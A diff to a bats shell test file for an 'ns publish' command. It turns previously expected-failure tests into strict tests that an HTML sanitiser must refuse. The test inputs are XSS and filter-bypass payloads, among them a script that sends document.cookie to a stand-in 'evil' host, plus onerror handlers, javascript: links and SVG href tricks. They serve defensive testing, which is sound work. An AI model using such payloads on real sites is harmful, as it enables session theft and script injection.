@@ -46,22 +46,6 @@ published() {
   [ -f "$DESK/runs/sbx-12/x.html" ]
 }
 
-# ns_xfail <reason> <command...>: a strict expected failure (bats has no xfail marker).
-# The command runs in a background subshell so errexit stays on inside it (bats' `run`
-# turns errexit off, which would hide a failing `[ ]`). Passes when the command fails;
-# fails with XPASS when it succeeds. The phase that implements the criterion deletes the
-# `ns_xfail "ns:ns-5 acceptance"` prefix from its tests, in the same commit as the code.
-ns_xfail() {
-  local reason="$1" rc=0
-  shift
-  "$@" &
-  wait "$!" || rc=$?
-  if [ "$rc" -eq 0 ]; then
-    echo "XPASS ($reason): $* succeeded; the expected failure is gone" >&2
-    return 1
-  fi
-}
-
 @test "publishing copies the file with mode 0640, records .published and index.md" {
   run ns publish sbx-12 RUN/plan.md:plan.md
   assert_success
@@ -94,7 +78,7 @@ ns_xfail() {
   printf '<html><script src="https://x"></script></html>\n' >"$RUNDIR/r.html"
   run ns publish sbx-12 RUN/r.html
   assert_failure 1
-  assert_output_contains "r.html: HTML must be self-contained (no external scripts or styles)"
+  assert_output_contains "r.html: HTML must be self-contained (no scripts, no external resources)"
   [ ! -e "$DESK/runs/sbx-12/r.html" ]
 }
 
@@ -115,70 +99,70 @@ ns_xfail() {
 }
 
 @test "issue #5 bypass a: protocol-relative link href is refused" {
-  ns_xfail "ns:ns-5 acceptance" refused '<link rel=stylesheet href=//evil/x.css>\n'
+  refused '<link rel=stylesheet href=//evil/x.css>\n'
 }
 
 @test "issue #5 bypass b: script with src on the next line is refused" {
-  ns_xfail "ns:ns-5 acceptance" refused '<script\nsrc="https://x"></script>\n'
+  refused '<script\nsrc="https://x"></script>\n'
 }
 
 @test "issue #5 bypass c: img with an https src is refused" {
-  ns_xfail "ns:ns-5 acceptance" refused '<img src="https://x">\n'
+  refused '<img src="https://x">\n'
 }
 
 @test "issue #5 bypass d: inline script is refused" {
-  ns_xfail "ns:ns-5 acceptance" refused '<script>fetch("https://evil/?"+document.cookie)</script>\n'
+  refused '<script>fetch("https://evil/?"+document.cookie)</script>\n'
 }
 
 @test "link with href on the next line is refused" {
-  ns_xfail "ns:ns-5 acceptance" refused '<link\nhref="https://x/a.css">\n'
+  refused '<link\nhref="https://x/a.css">\n'
 }
 
 @test "uppercase SCRIPT is refused" {
-  ns_xfail "ns:ns-5 acceptance" refused '<SCRIPT>alert(1)</SCRIPT>\n'
+  refused '<SCRIPT>alert(1)</SCRIPT>\n'
 }
 
 @test "single-quoted protocol-relative src is refused" {
-  ns_xfail "ns:ns-5 acceptance" refused "<img src='//x'>\n"
+  refused "<img src='//x'>\n"
 }
 
 @test "unquoted http src is refused" {
-  ns_xfail "ns:ns-5 acceptance" refused '<img src=http://x>\n'
+  refused '<img src=http://x>\n'
 }
 
 @test "an onerror handler is refused" {
-  ns_xfail "ns:ns-5 acceptance" refused '<img src="data:image/png;base64,AA==" onerror="fetch(1)">\n'
+  refused '<img src="data:image/png;base64,AA==" onerror="fetch(1)">\n'
 }
 
 @test "a remote CSS url() is refused" {
-  ns_xfail "ns:ns-5 acceptance" refused '<p style="background:url(//x)">hi</p>\n'
+  refused '<p style="background:url(//x)">hi</p>\n'
 }
 
 @test "a quoted > does not end the tag early" {
-  ns_xfail "ns:ns-5 acceptance" refused '<svg><image title=">" href=//x/></svg>\n'
+  refused '<svg><image title=">" href=//x/></svg>\n'
 }
 
 @test "a handler right after a closing quote is refused" {
-  ns_xfail "ns:ns-5 acceptance" refused '<img src="data:image/png;base64,AA=="onerror="fetch(1)">\n'
+  refused '<img src="data:image/png;base64,AA=="onerror="fetch(1)">\n'
 }
 
 @test "a handler after a stray quote is refused" {
-  ns_xfail "ns:ns-5 acceptance" refused '<img src=data:x title=a"b onerror=fetch(1)>\n'
+  refused '<img src=data:x title=a"b onerror=fetch(1)>\n'
 }
 
 @test "svg href and xlink:href are refused" {
-  ns_xfail "ns:ns-5 acceptance" refused '<svg><image href="https://x"/></svg>\n'
-  ns_xfail "ns:ns-5 acceptance" refused '<svg><use xlink:href="//x#a"/></svg>\n'
+  refused '<svg><image href="https://x"/></svg>\n'
+  refused '<svg><use xlink:href="//x#a"/></svg>\n'
 }
 
 @test "srcset, meta refresh and javascript: are refused" {
-  ns_xfail "ns:ns-5 acceptance" refused '<img srcset="a.png 1x, https://x 2x">\n'
-  ns_xfail "ns:ns-5 acceptance" refused '<meta http-equiv="refresh" content="0;url=https://x">\n'
-  ns_xfail "ns:ns-5 acceptance" refused '<a href="javascript:alert(1)">x</a>\n'
+  refused '<img srcset="a.png 1x, https://x 2x">\n'
+  refused '<meta http-equiv="refresh" content="0;url=https://x">\n'
+  refused '<a href="javascript:alert(1)">x</a>\n'
 }
 
 @test "a file with a NUL byte is refused" {
-  ns_xfail "ns:ns-5 acceptance" refused '<p>a\0b</p>\n'
+  refused '<p>a\0b</p>\n'
 }
 
 @test "inline style, a data: image and an a href link are published" {
